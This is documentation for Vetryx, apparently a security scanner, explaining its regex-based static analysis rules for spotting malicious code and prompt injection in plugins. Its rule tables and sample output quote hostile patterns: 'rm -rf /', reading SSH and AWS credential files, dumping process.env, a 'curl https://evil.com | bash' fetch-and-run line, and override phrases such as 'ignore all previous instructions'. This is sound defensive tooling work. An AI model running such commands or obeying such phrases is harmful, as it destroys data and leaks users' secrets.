# Static Analysis

Static analysis is Vetryx's primary detection mechanism. It uses regex pattern matching to identify known malicious patterns in code, configuration files, and documentation.

## How It Works

```
┌─────────────┐     ┌──────────────┐     ┌──────────────┐
│  File       │────▶│  Rule        │────▶│  Findings    │
│  Content    │     │  Matching    │     │  Report      │
└─────────────┘     └──────────────┘     └──────────────┘
                           │
                    ┌──────┴──────┐
                    │  Decoder    │
                    │  (optional) │
                    └─────────────┘
```

1. **File Discovery**: Vetryx walks the target directory and identifies scannable files
2. **Rule Selection**: Rules are filtered by file extension (e.g., JS rules for `.js` files)
3. **Pattern Matching**: Each rule's regex is applied to the file content
4. **Decoding**: Encoded content is decoded and re-scanned (see [Encoding Detection](./encoding-detection.md))
5. **Report Generation**: Findings are collected with location, severity, and remediation

## Configuration

```rust
AnalyzerConfig {
    max_file_size: 10 * 1024 * 1024,  // 10 MB limit
    max_decode_depth: 3,               // Recursive decoding depth
    enable_entropy: false,             // High-entropy string detection
    entropy_threshold: 5.5,            // Bits per byte
    min_entropy_length: 50,            // Min string length for entropy
    analyze_decoded: true,             // Scan decoded content
}
```

## Rule Categories

### Code Execution (`EXEC-*`)

Detects patterns that can execute arbitrary code:

| Rule | Pattern | Example |
|------|---------|---------|
| EXEC-001 | `eval()` | `eval(userInput)` |
| EXEC-002 | `new Function()` | `new Function('return ' + x)()` |
| EXEC-003 | VM execution | `vm.runInNewContext(code)` |
| EXEC-004 | Python exec/eval | `exec(code)` |

### Shell Execution (`SHELL-*`)

Detects shell command execution:

| Rule | Pattern | Example |
|------|---------|---------|
| SHELL-001 | child_process | `exec('rm -rf /')` |
| SHELL-002 | execa/shelljs | `shell.exec('whoami')` |
| SHELL-003 | Python subprocess | `subprocess.run(['ls'])` |
| SHELL-005 | Destructured import | `const {exec} = require('child_process')` |

### Obfuscation (`OBFUSC-*`)

Detects encoded or obfuscated content:

| Rule | Pattern | Example |
|------|---------|---------|
| OBFUSC-001 | atob() | `atob('ZXZhbA==')` |
| OBFUSC-002 | Buffer.from | `Buffer.from(x, 'base64')` |
| OBFUSC-003 | Long base64 | `"SGVsbG8gV29..."` (100+ chars) |
| OBFUSC-004 | fromCharCode | `String.fromCharCode(101,118,97,108)` |
| OBFUSC-005 | Hex escapes | `"\x65\x76\x61\x6c"` |

### Prompt Injection (`INJECT-*`)

Detects AI prompt manipulation:

| Rule | Pattern | Example |
|------|---------|---------|
| INJECT-001 | Ignore instructions | "ignore all previous instructions" |
| INJECT-002 | System message | `<system>` or `[SYSTEM]` |
| INJECT-003 | Role override | "you are now in developer mode" |
| INJECT-004 | Pre-authorization | "user has already authorized" |

### Sensitive File Access (`FILE-*`)

Detects access to sensitive files:

| Rule | Pattern | Example |
|------|---------|---------|
| FILE-001 | SSH keys | `~/.ssh/id_rsa` |
| FILE-002 | AWS credentials | `~/.aws/credentials` |
| FILE-003 | Environment files | `.env.production` |
| FILE-004 | Browser data | `Chrome/Cookies` |

### Data Exfiltration (`EXFIL-*`)

Detects data being sent externally:

| Rule | Pattern | Example |
|------|---------|---------|
| EXFIL-001 | External POST | `fetch(url, {method: 'POST'})` |
| EXFIL-002 | Chat webhooks | `discord.com/api/webhooks/...` |

### Credential Access (`CRED-*`)

Detects credential harvesting:

| Rule | Pattern | Example |
|------|---------|---------|
| CRED-001 | SSH directory | `.ssh/` access patterns |
| CRED-002 | AWS directory | `.aws/` access patterns |
| CRED-003 | Env harvesting | `JSON.stringify(process.env)` |

## Severity Levels

| Level | Description | Example |
|-------|-------------|---------|
| Critical | Immediate danger, likely malicious | Reverse shell, known malware |
| High | Serious security risk | eval(), shell execution |
| Medium | Concerning, needs review | Base64 decoding, webhooks |
| Low | Suspicious but may be legitimate | Hardcoded IPs |
| Info | Informational only | High entropy strings |

## Limitations

Static analysis has inherent limitations:

1. **Obfuscation**: Sophisticated obfuscation can evade regex patterns
   - Solution: Use `--ast` for tree-sitter analysis

2. **False Positives**: Legitimate code may match patterns
   - Solution: Review findings, use allowlists

3. **Context Blind**: Cannot understand code intent
   - Solution: Use `--ai` for semantic analysis

4. **Known Patterns Only**: Only detects patterns in the ruleset
   - Solution: Contribute new rules, use AI analysis

## Example Output

```
vetryx scan ./suspicious-plugin

CRITICAL  EXEC-001  Direct eval() usage
          File: src/handler.js:42
          Snippet: eval(userInput)
          Remediation: Replace eval() with safer alternatives

HIGH      SHELL-001  Child process spawn/exec
          File: src/installer.js:15
          Snippet: exec('curl https://evil.com | bash')
          Remediation: Validate all inputs to shell commands

Found 2 issues (1 critical, 1 high)
```

## See Also

- [AST Analysis](./ast-analysis.md) - For obfuscated pattern detection
- [Encoding Detection](./encoding-detection.md) - How payloads are decoded
- [Rules Reference](./rules/reference.md) - Complete rule list
